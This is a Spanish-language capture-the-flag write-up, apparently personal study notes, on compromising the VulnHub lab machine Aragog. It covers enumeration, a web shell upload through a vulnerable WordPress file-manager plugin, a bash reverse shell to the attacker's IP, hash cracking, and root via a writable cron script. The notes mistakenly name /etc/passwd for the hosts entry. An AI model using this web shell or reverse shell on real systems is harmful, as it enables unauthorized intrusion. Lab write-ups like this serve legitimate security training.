#ctf-machine #vulnhub #easy-machine #linux #simulacion-eccptv2 [[Simulation eCPPTv2 Map.canvas|Simulation eCPPTv2 Map]]

## Enumeración inicial
Primeramente realizamos un escaneo ARP con `arp-scan` para identificar la IPv4 de la máquina objetivo:
![[Pasted image 20240828164111.png]]

Sabemos que la IPv4 de la máquina víctima es "192.158.149.147" porque su OUI de la MAC es "00:0c".

Si le lanzamos una traza ICMP con `ping` podemos decir que probablemente se trate de una máquina Linux, ya que suelen tener el valor de TTL cercano a 64:
![[Pasted image 20240828164300.png]]

### Nmap
Lanzamos un primer escaneo con `nmap` para detectar los puertos TCP abiertos:
![[Pasted image 20240828164600.png]]

Como vemos hay 2 puertos abiertos, los puertos 22 (SSH) y 80 (HTTP). Así que lanzamos un segundo escaneo con `nmap` para detectar la versión y servicio que corren para estos dos puertos:
![[Pasted image 20240828164827.png]]

Como vemos esta ejecutando el servicio de "OpenSSH 7.9p1" y el servicio "Apache httpd 2.4.28" ambos de la versión de "Debian" por lo que podemos asegurar que se trata de un sistema Linux.

Hacemos un tercer escaneo con `nmap` para descubrir algunos directorios web que corren por el puerto 80 utilizando el script "http-enum":
![[Pasted image 20240828165154.png]]

Como vemos detecta dos directorios, uno de ellos parece ser un panel de login de WordPress.


## Enumeración web
Si accedemos a la web, vemos una primera imagen:
![[Pasted image 20240828201236.png]]

Como vemos no hay nada interesante así que accedemos al directorio `/blog` que nos había reportado `nmap`. Si accedemos vemos que no carga el contenido correctamente:
![[Pasted image 20240828201354.png]]

Eso es debido a que se está aplicando *virtual hosting*, si accedemos al código fuente de la página podemos verlo:
![[Pasted image 20240828201448.png]]

Así que añadimos este domino en el archivo `/etc/passwd`:
![[Pasted image 20240828201904.png]]

Por lo que si actualizamos la web ahora si se ve el contenido bien:
![[Pasted image 20240828201941.png]]

Si hacemos un escaneo con `gobuster` dentro del directorio `/blog`, vemos lo siguiente:
![[Pasted image 20240828202953.png]]

Como vemos hay un archivo `/blog/wp-signup.php` que puede permitir registrarnos en WordPress.
Pero si accedemos nos indica que no podemos registrarnos, ya que no está habilitado:
![[Pasted image 20240828203430.png]]

## RCE
Si hacemos un escaneo agresivo de *plugins* de WordPress con `wpscan` vemos lo siguiente:
![[Pasted image 20240828222843.png]]

Como vemos hay una vulnerabilidad que nos permite RCE por lo que si buscamos sobre este *plugin* en `searchsploit`:
![[Pasted image 20240828223025.png]]

Si accedemos a la siguiente URL podemos visualizar la versión del *plugin*:
http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/readme.txt
![[Pasted image 20240828223403.png]]

Como vemos, es vulnerable, por lo que analizamos el *exploit* debemos comprobar que el siguiente *link*, nos devuelva "errUnknownCmd":
http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
![[Pasted image 20240828223646.png]]

Y como vemos, aparece el mensaje. Por lo que si analizamos el *exploit* vemos que podemos subir un archivo PHP malicioso utilizando el `connector.minimal.php`. Por lo que tramitamos una solicitud con `curl` para subir el archivo:
![[Pasted image 20240828230036.png]]

El archivo PHP subido es el siguiente:
```php
<?php system($_GET['cmd']); ?>
```

Como vemos se ha subido el archivo por lo que si accedemos a la URL que se nos indica y utilizamos el parámetro "cmd" tenemos RCE:
![[Pasted image 20240828230142.png]]

Así que nos podemos entablar una *reverse shell* utilizando el comando:
```bash
bash -c "bash -i >& /dev/tcp/192.168.159.131/443 0>&1"
```

Y poniéndonos en escucha con `nc` en el puerto 443 obtenemos una *shell* como "www-data":
![[Pasted image 20240828231053.png]]

Así que hacemos el tratamiento de la TTY para que sea mas cómodo movernos con la *shell*:
![[Pasted image 20240828231225.png]]![[Pasted image 20240828231312.png]]

## Escalada de privilegios
Si accedemos a `/etc/wordpress/config-default.php` vemos unas credenciales de la base de datos:
![[Pasted image 20240828232522.png]]

Si accedemos a ella y mostramos la tabla "wp_users" de la base de datos de WordPress vemos un *hash* del usuario "hagrid98" que es un usuario existente en la máquina víctima:
![[Pasted image 20240828232819.png]]
![[Pasted image 20240828232925.png]]

Si intentamos *crackear* la contraseña del usuario con `hashcat` y el diccionario "rockyou.txt":
```bash
hashcat hash /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20240828233141.png]]

Por lo que si intentamos migrar al usuario "hagrid98", lo conseguimos:
![[Pasted image 20240828233342.png]]

Si accedemos al directorio `/home/hagrid98` podemos visualizar la primera *flag*:
![[Pasted image 20240828233445.png]]
![[Pasted image 20240828233521.png]]

Si utilizamos `pspy` para detectar comandos que se ejecutan a intervalos de tiempo definidos, encontramos este comando ejecutado por *root*:
![[Pasted image 20240828234854.png]]

La cual cosa nos permite elevar privilegios porque el dueño de este archivo es el usuario "hagrid68":
![[Pasted image 20240828234955.png]]

Así que si lo modificamos y ponemos la siguiente instrucción
![[Pasted image 20240828235102.png]]

Llegará un momento que *root* ejecute la instrucción y asigne el permiso SUID a la "bash":
![[Pasted image 20240828235208.png]]

Una vez asignado el permiso SUID al binario, si ejecutamos el comando `bash -p` obtenemos una "bash" como *root*:
![[Pasted image 20240828235255.png]]

Y podemos visualizar la última *flag* en el directorio `/root`:
![[Pasted image 20240828235338.png]]
![[Pasted image 20240829000733.png]]

___
#abusing-cron-tasks #file-upload-attacks #hash-cracking 
___
